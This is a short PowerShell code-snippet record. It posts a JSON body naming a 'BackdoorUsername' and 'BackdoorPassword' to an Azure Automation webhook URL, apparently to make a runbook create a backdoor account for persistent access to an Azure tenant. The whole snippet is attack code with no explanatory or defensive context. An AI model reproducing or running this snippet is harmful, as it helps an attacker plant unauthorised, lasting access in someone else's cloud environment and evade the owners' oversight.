---
id: 29f6ef0e-03a0-44f9-b7bf-c8867d8e28ae
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:15.581050+00:00'
updated_at: '2023-05-25T02:58:33.348455+00:00'
---

# Code Snippet 29f6ef0e

**Language**: Powershell

```powershell
$uri = "https://s15events.azure-automation.net/webhooks?token=h6[REDACTED]%3d"
$AccountInfo  = @(@{RequestBody=@{Username="BackdoorUsername";Password="BackdoorPassword"}})
$body = ConvertTo-Json -InputObject $AccountInfo
$response = Invoke-WebRequest -Method Post -Uri $uri -Body $body
```
